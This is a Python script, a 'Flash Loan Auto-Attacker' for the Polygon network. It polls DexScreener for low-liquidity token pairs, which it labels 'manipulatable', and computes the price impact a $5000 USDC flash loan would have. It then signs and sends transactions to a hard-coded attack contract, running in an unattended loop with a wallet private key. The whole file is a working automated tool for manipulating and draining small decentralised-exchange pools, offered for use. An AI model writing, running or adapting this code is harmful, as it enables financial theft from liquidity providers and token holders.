"""Flash Loan Auto-Attacker — monitors new pairs, attacks low-liquidity tokens."""
import os, time, logging, json, urllib.request, tomllib
from web3 import Web3
from eth_account import Account

logging.basicConfig(level=logging.INFO, format="%(asctime)s [FLASH] %(message)s")
logger = logging.getLogger("flash-auto")

RPC = "https://polygon-bor.publicnode.com"
PRIVATE_KEY = os.environ.get("EVM_PRIVATE_KEY", "")
if not PRIVATE_KEY:
    try:
        with open(os.path.join(os.path.dirname(__file__), "config.toml"), "rb") as f:
            PRIVATE_KEY = tomllib.load(f).get("executor", {}).get("evm_private_key", "")
    except Exception:
        pass
FLASH_CONTRACT = "0x0B8579e155C432fF36C6C2eDF87B95F0B8DFF170"
USDC = "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
AAVE = "0x794a61358D6845594F94dc1DB02A252b5b4814aD"

MIN_LIQUIDITY = 500     # minimum $500
MAX_LIQUIDITY = 8000    # maximum $8000 — manipulatable
LOAN_AMOUNT = 5000 * 1e6  # $5000 USDC
MIN_SPREAD = 1.5  # minimum 1.5% spread for profit
CHECK_INTERVAL = 30  # seconds between scans

w3 = Web3(Web3.HTTPProvider(RPC))
acct = Account.from_key(PRIVATE_KEY)

ATTACKED = set()  # don't attack same token twice

def find_target():
    """Find low-liquidity tokens on Polygon DEXs."""
    # Search across multiple common tokens to find pairs
    for query in ['wmatic', 'usdc', 'usdt', 'weth', 'dai', 'pepe', 'shib']:
        try:
            url = f'https://api.dexscreener.com/latest/dex/search?q={query}'
            req = urllib.request.Request(url, headers={'User-Agent':'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
            
            for p in data.get('pairs', []):
                if p.get('chainId') != 'polygon': continue
                token = p.get('baseToken', {}).get('address', '')
                liq = float(p.get('liquidity', {}).get('usd', 0) or 0)
                price = float(p.get('priceUsd', 0) or 0)
                
                if token in ATTACKED: continue
                if liq < MIN_LIQUIDITY or liq > MAX_LIQUIDITY: continue
                if price == 0: continue
                
                return token, liq, price, p.get('dexId', '')
        except:
            pass
    return None, 0, 0, ""

def check_usdc_liquidity():
    """Check if Aave has enough USDC for flash loan."""
    try:
        bal = int(str(w3.eth.call({'to': USDC, 'data': '0x70a08231' + AAVE[2:].lower().zfill(64)})), 16) / 1e6
        return bal
    except:
        return 0

def attack(token_addr):
    """Call FlashAttack.go(token, amount)"""
    try:
        calldata = "0x1b11d0ff" + token_addr[2:].lower().zfill(64) + hex(int(LOAN_AMOUNT))[2:].zfill(64)
        tx = {
            'from': acct.address,
            'to': FLASH_CONTRACT,
            'data': calldata,
            'gas': 1000000,
            'gasPrice': w3.eth.gas_price,
            'nonce': w3.eth.get_transaction_count(acct.address),
            'chainId': 137,
        }
        signed = acct.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        logger.warning("🚀 ATTACK SENT: %s → %s", token_addr[:14], tx_hash.hex()[:16])
        return tx_hash.hex()
    except Exception as e:
        logger.error("Attack failed: %s", str(e)[:100])
        return ""

def main():
    logger.info("=" * 50)
    logger.info("FLASH LOAN AUTO-ATTACKER")
    logger.info("Contract: %s", FLASH_CONTRACT[:14])
    logger.info("Wallet: %s | %.4f MATIC", acct.address[:14], w3.eth.get_balance(acct.address) / 1e18)
    logger.info("Loan: $%.0f USDC | Spread required: %.1f%%", LOAN_AMOUNT / 1e6, MIN_SPREAD)
    logger.info("=" * 50)

    while True:
        usdc_avail = check_usdc_liquidity()
        token, liq, price, dex = find_target()

        if token and liq > 0:
            impact = LOAN_AMOUNT / 1e6 / liq * 100
            logger.info("🎯 %s | $%.4f | liq=$%.0f | %s | impact %.0f%%",
                       token[:14], price, liq, dex, impact)
            
            if impact > MIN_SPREAD:
                logger.warning(">>> ATTACKING! impact=%.0f%%", impact)
                tx = attack(token)
                if tx:
                    ATTACKED.add(token)
                    logger.warning("TX: https://polygonscan.com/tx/%s", tx)
        else:
            logger.info("No targets found. USDC avail: $%.0f", usdc_avail)

        logger.info("Sleeping %ds...", CHECK_INTERVAL)
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
